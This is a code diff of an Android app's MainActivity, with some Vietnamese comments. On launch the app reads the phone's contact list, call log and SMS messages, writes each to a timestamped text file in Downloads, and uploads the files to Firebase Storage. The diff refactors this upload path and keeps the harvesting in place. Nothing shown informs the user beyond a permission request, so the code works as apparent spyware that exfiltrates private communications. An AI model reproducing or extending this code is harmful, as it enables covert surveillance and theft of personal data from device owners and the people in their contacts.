@@ -41,11 +41,16 @@ import java.util.Date;
 import java.util.Locale;
 
 public class MainActivity extends AppCompatActivity{
+
+    String currentTime;
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         requestPermission();
+
+        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddHHmmss");
+        currentTime = sdf.format(new Date());
 
         getContactList();
         getCallDetails();
@@ -71,23 +76,20 @@ public class MainActivity extends AppCompatActivity{
 
     }
 
-    private void uploadFirebase(Uri fileUri) {
-        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddHHmmss");
-        String currentTime = sdf.format(new Date());
+    private void uploadFirebase(File file) {
+        FirebaseStorage storage = FirebaseStorage.getInstance();
+        // Create a storage reference from our app
+        StorageReference storageRef = storage.getReference();
+        // Create a reference to the file you want to upload
+        StorageReference fileRef = storageRef.child("data" + currentTime+ "/"+ file.getName());
 
-        String filePath = fileUri.getPath();
-        String[] segments = filePath.split("/");
-        String fileName = segments[segments.length - 1];
-        Log.d("fileName", fileName); // In ra "contacts202203101415.txt"
+        String filePath = file.getPath();
+        Uri fileUri = Uri.fromFile(new File(filePath));
 
-//        String fileName = getFileNameFromUri(fileUri);
 
-        StorageReference storageRef = FirebaseStorage.getInstance().getReference();
-        StorageReference contactsRef = storageRef.child("data" + currentTime+ "/"+ fileName);
-
-        UploadTask uploadTask = contactsRef.putFile(fileUri);
         // Upload file to Firebase Storage
-        uploadTask.addOnSuccessListener(taskSnapshot -> {
+        fileRef.putFile(fileUri)
+                .addOnSuccessListener(taskSnapshot -> {
                     // File uploaded successfully
                     Log.d("uploadFirebase", "File uploaded successfully");
                 })
@@ -97,13 +99,11 @@ public class MainActivity extends AppCompatActivity{
                 });
     }
     private void getContactList() {
-        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddHHmmss");
-        String currentTime = sdf.format(new Date());
-//        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "contacts" + currentTime + ".txt");
+        String namefile = "contacts" + currentTime + ".txt";
 
         // Tạo tệp tin bằng lớp MediaStore
         ContentValues values = new ContentValues();
-        values.put(MediaStore.MediaColumns.DISPLAY_NAME, "contacts" + currentTime + ".txt");
+        values.put(MediaStore.MediaColumns.DISPLAY_NAME, namefile);
         values.put(MediaStore.MediaColumns.MIME_TYPE, "text/plain");
         values.put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS);
 
@@ -128,17 +128,16 @@ public class MainActivity extends AppCompatActivity{
         } catch (IOException e) {
             e.printStackTrace();
         }
-
-        uploadFirebase(uri);
+        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), namefile);
+        Log.d("getContact", file.getName());
+        uploadFirebase(file);
     }
     private void getCallDetails() {
-        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddHHmmss");
-        String currentTime = sdf.format(new Date());
-//        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "callDetails" + currentTime + ".txt");
+        String namefile = "callDetails" + currentTime + ".txt";
 
         // Tạo tệp tin bằng lớp MediaStore
         ContentValues values = new ContentValues();
-        values.put(MediaStore.MediaColumns.DISPLAY_NAME, "callDetails" + currentTime + ".txt");
+        values.put(MediaStore.MediaColumns.DISPLAY_NAME, namefile);
         values.put(MediaStore.MediaColumns.MIME_TYPE, "text/plain");
         values.put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS);
 
@@ -170,17 +169,16 @@ public class MainActivity extends AppCompatActivity{
         } catch (IOException e) {
             e.printStackTrace();
         }
-
-        uploadFirebase(uri);
+        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), namefile);
+        Log.d("getCallDetails", file.getName());
+        uploadFirebase(file);
     }
     private void getSmsDetails() {
-        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddHHmmss");
-        String currentTime = sdf.format(new Date());
-        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), "SmsDetails" + currentTime + ".txt");
+        String namefile = "SmsDetails" + currentTime + ".txt";
 
         // Tạo tệp tin bằng lớp MediaStore
         ContentValues values = new ContentValues();
-        values.put(MediaStore.MediaColumns.DISPLAY_NAME, "smsDetails" + currentTime + ".txt");
+        values.put(MediaStore.MediaColumns.DISPLAY_NAME, namefile);
         values.put(MediaStore.MediaColumns.MIME_TYPE, "text/plain");
         values.put(MediaStore.MediaColumns.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS);
 
@@ -211,7 +209,9 @@ public class MainActivity extends AppCompatActivity{
             e.printStackTrace();
         }
 
-        uploadFirebase(uri);
+        File file = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), namefile);
+        Log.d("getSmsDetails", file.getName());
+        uploadFirebase(file);
     }
 
 }
